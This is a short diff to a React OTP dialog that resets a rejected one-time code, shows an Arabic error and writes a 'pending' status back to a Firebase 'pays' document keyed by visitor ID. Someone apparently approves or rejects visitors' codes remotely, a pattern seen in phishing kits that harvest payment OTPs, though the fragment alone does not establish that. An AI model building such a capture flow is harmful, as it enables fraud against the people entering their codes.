@@ -82,16 +82,17 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
             }, 1000)
           } else if (status === "rejected") {
             console.log("[PhoneOTP] OTP rejected")
-            setOtpStatus("waiting") // Reset to waiting instead of rejected
+            setOtpStatus("waiting") // Reset to waiting to allow re-entry
             setOtp("") // Clear the old code
-            setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
+            setError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
+            inputRef.current?.focus() // Focus back on input
             
-            // Clear the rejected status in Firebase after showing error
+            // Clear the rejected status in Firebase to allow new submission
             setTimeout(async () => {
               await updateDoc(doc(db, "pays", visitorID), {
-                phoneOtpStatus: "verifying" // Keep modal open for new input
+                phoneOtpStatus: "pending" // Reset to pending for new attempt
               })
-            }, 1000)
+            }, 500)
           }
         }
       },
